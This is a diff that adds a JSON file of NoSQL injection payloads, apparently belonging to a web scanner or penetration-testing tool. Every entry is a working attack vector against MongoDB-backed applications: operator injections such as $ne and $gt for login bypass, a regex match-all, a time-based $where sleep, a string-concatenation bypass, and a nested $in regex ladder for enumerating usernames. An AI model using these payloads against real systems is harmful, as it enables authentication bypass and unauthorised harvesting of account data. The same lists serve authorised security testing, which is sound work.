@@ -1,0 +1,42 @@
+{
+  "class": "nosql",
+  "order": "bypass-first",
+  "note": "MongoDB operator injection + regex/auth-bypass ladders; boolean pairs are meant to be diffed with res_diff.",
+  "payloads": [
+    {
+      "id": "nosql::01",
+      "vector": "{\"$ne\": null}",
+      "note": "operator injection on any scalar field (json body)"
+    },
+    {
+      "id": "nosql::02",
+      "vector": "{\"$gt\": \"\"}",
+      "note": "alt operator — boolean pair with ::03"
+    },
+    {
+      "id": "nosql::03",
+      "vector": "{\"$exists\": false}",
+      "note": "control pair for ::02"
+    },
+    {
+      "id": "nosql::04",
+      "vector": "{\"$regex\": \".*\"}",
+      "note": "regex match-all"
+    },
+    {
+      "id": "nosql::05",
+      "vector": "{\"$where\": \"sleep(5000) || true\"}",
+      "note": "server-side $where — time-based (keep volume tiny)"
+    },
+    {
+      "id": "nosql::06",
+      "vector": "admin' || '1'=='1",
+      "note": "string-concat injection (node drivers)"
+    },
+    {
+      "id": "nosql::07",
+      "vector": "{\"username\":{\"$in\":[{\"$regex\":\"^a\"},{\"$regex\":\"^b\"}]}}",
+      "note": "nested $in enumeration ladder"
+    }
+  ]
+}
